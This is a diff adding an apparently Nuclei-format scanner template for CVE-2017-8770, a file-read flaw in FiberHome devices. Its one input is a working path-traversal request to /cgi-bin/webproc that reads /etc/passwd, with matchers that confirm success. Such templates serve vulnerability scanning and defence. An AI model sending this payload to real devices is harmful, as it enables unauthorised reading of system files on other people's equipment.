@@ -1,0 +1,30 @@
+id: fiberhome-file-read-cve-2017-8770
+
+info:
+  name: FIBERHOME File Read (CVE-2017-8770)
+  author: ProjectDiscoveryAI
+  description: |
+    Hackers can obtain important files by this vulnerability.
+  severity: high
+  reference:
+    - https://www.exploit-db.com/exploits/42547/
+  tags: file-read
+  classification:
+    cve-id: CVE-2017-8770
+
+tcp:
+  - inputs:
+      - data: "GET /cgi-bin/webproc?getpage=../../../../etc/passwd&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:login=true&var:page=wizard HTTP/1.1\r\nHost: {{Hostname}}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
+    host:
+      - "{{Hostname}}"
+    port: 80
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "/bin/sh"
+          - "root:"
+        part: body
+      - type: status
+        status:
+          - 200
